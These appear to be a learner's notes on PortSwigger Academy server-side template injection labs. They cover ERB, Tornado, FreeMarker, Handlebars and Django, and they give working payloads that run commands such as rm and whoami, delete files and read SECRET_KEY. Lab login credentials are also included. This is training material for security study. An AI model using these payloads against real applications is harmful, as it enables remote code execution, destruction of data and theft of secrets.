- hacktricks notes help a lot.
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Lab - 1: Basic server-side template injection (P)

- This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template. To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

- click view details for some of the item and return a message `Unfortunately this product is out of stock`
- the url is also as follow

```
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1
```

- try to inject that message value

- `/?message={{7*7}}` not working
- `/?message=<%invalid%>` - return error
- `/?message=<%= File.delete("/home/carlos/morale.txt") %> HTTP/1.1` OR
- `/?message=<%= system("rm /home/carlos/morale.txt") %>`

---

## Lab - 2: Basic server-side template injection (code context) (P)

- This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. You can log in to your own account using the following credentials: wiener:peter

- login with `wiener`
- walkthrough the website and found a potential vulnerability at changing Prefer name and the request looks like

```
POST /my-account/change-blog-post-author-display HTTP/1.1
...

blog-post-author-display=user.name&csrf=qgNUnESXG6AbZaNQDreZKQN1wb5Z62DF
```

> this lab is not working. Try it later

---

## Lab - 3: Server-side template injection using documentation (P)

- This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. You can log in to your own account using the following credentials:
- content-manager:C0nt3ntM4n4g3r

- can use template at editing contents
- try with

```
${7*7} - working
${7*'7'} - not working
${T(java.lang.Runtime)} - error # FreeMarker template error (DEBUG mode; use RETHROW in production!) and search in google and found Spring MVC
${"freemarker.template.utility.Execute"?new()("whoami")} - will get carlos
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

---

## Lab - 4: Server-side template injection in an unknown language with a documented exploit (P)

- This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

- potential vulnerability is found at `GET /?messge=something`
- try to inject with `{{7*&}}` and will get an error
- in error see the path `/usr/local/lib/node_modules/handlebar`

- found this blogpost here
- http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

```
GET /?message={{%23with+"s"+as+|string|}}
++{{%23with+"e"}}
++++{{%23with+split+as+|conslist|}}
++++++{{this.pop}}
++++++{{this.push+(lookup+string.sub+"constructor")}}
++++++{{this.pop}}
++++++{{%23with+string.split+as+|codelist|}}
++++++++{{this.pop}}
++++++++{{this.push+"return+require('child_process').exec('rm+/home/carlos/morale.txt')%3b"}}
++++++++{{this.pop}}
++++++++{{%23each+conslist}}
++++++++++{{%23with+(string.sub.apply+0+codelist)}}
++++++++++++{{this}}
++++++++++{{/with}}
++++++++{{/each}}
++++++{{/with}}
++++{{/with}}
++{{/with}}
{{/with}} HTTP/1.1
Host: 0a0b001d04bb174bc0cb8873005200c2.web-security-academy.net
...
```

---

## Lab - 5: Server-side template injection with information disclosure via user-supplied objects (P)

- This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data. To solve the lab, steal and submit the framework's secret key. You can log in to your own account using the following credentials:
- content-manager:C0nt3ntM4n4g3r

- it uses DJANGO framework (jinja template)
- {{settings.SECRET_KEY}}

---
